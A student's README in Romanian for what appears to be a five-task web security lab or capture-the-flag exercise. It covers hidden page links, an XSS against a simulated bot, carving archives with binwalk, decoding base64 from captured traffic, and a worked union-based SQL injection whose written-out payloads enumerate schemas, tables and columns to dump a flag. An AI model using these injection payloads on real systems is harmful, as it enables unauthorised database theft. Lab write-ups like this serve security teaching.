# MARIN MARIUS DANIEL 332CC

### Task1
- ne conectam la dev-machine folosind `./connect.sh` iar apoi vedem ce adresa ip avem
- scanam porturile disponibile si vedem un `port deschis de http` la o adresa ip
- luam adresa ip si portul de http si le dam in scriptul de `./webtunnel.sh` pentru a ne
conecta pe web la `localhost:8080`
- pe site observam ca pagina de register e fake, si cautam cu inspect element in codul
sursa al site ului si vedem ca link ul bun este `/auth/register_real_one`
- ne facem cont, ne conectam si cautam iar cu inspect element in codul sursa al site
ului si gasim flagul

### Task2
- din hint uri si analiza sursei paginii web observam faptul ca putem comunica cu pisica
boss prin nyan cat (avem XSS simulators doar pentru ei)
- daca ne uitam in main.js observam niste functii pe care am putea sa le apelam ca sa
rezolvam acest task
- logica este aceea de a-i trimite lui nyan cat un mesaj care sa contina un script pe care
sa il trimita pentru a fi executat de catre boss (acesta sa apeleze addFriendRequest cu id ul
nostru)

### Task3
- avem la boss in pagina un hint cu scriptul `backup.sh` care trebuie luat de pe pagina
- observam ca scriptul combina 2 arhive intr una singura si ii pune numele cu o data
generata random intr un interval
- odata luata arhiva, se inspecteaza cu un tool pentru a vedea offset ul headerelor cum
ar fi `binwalk`
- se extrage cu tail offsetul arhivei flag, care se dezarhiveaza si astfel avem acces
la fisierul `flag.txt`

### Task4
- se testeaza manual url-urile site ului si se fac incercari de SQL injection pana se 
observa ca vulnerabilitatea este la adresa `http://localhost:8080/inside/p/`
- se incearca aflarea nr de coloane printr un payload care primeste ca arg nr coloanei
pentru a vedea la ce index apare eroarea (ex: ' order by X -- ;)
- se trimit mai multe atacuri pentru a afla informatia pas cu pas:
1 se observa ca se afiseaza informatia la userul 3 si apar duplicate => distinct
`' union select distinct 1, 2, group_concat(distinct(table_schema)), 4, 5, 6, 7, 8
from information_schema.tables -- ;`
  observam web_270

1 `' union select distinct 1, 2, group_concat(table_name), 4, 5, 6, 7, 8 from 
information_schema.tables where table_schema='web_270' -- ;`
  observam flags64173

1 `' union select 1, 2, group_concat(column_name), 4, 5, 6, 7, 8
from information_schema.columns where table_schema='web_270' and table_name='flags64173' -- ;`
  observam zaflag
  
1 `' union select 1, 2, zaflag, 4, 5, 6, 7, 8 from flags64173 -- ;`
  observam flag ul

### Task5
- se scaneaza traficul cu tcpdump si se observa ca anumite pachete contin `NYAN.NYAN..`
- se ia partea dintre NYAN si se decodifica cu `base64`
